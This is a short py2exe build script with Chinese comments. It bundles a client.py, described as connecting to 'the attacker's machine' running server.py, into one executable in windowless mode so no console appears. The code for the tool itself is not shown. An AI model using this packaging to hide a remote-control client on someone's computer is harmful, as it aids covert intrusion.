# 运行方法
# c:\python34\python setup.py py2exe
# 如果报错则需安装https://blog.csdn.net/justheretobe/article/details/50573617这里说的pyreadline(pip install pyreadline)
# 也即所有步骤如下：
# 1.安装python34到c:\python34
# 2.c:\Python34\Scripts\pip install py2exe
# 3.c:\Python34\Scripts\pip install pyreadline
# 4.c:\Python34\Scripts\pip install requests(client.py需要requests
# 5.修改client.py中的攻击者使用的机器的ip地址，也即运行server.py的机器的ip
# 6.c:\python34\python setup.py py2exe

from distutils.core import setup
import py2exe

options = {"py2exe":{"compressed":1,
                     "optimize":2,
                     "bundle_files":1
                     }}
# windows代表无console运行,不弹黑窗,console代表会弹黑窗
setup(windows=["client.py"],
      options=options,
      zipfile=None)
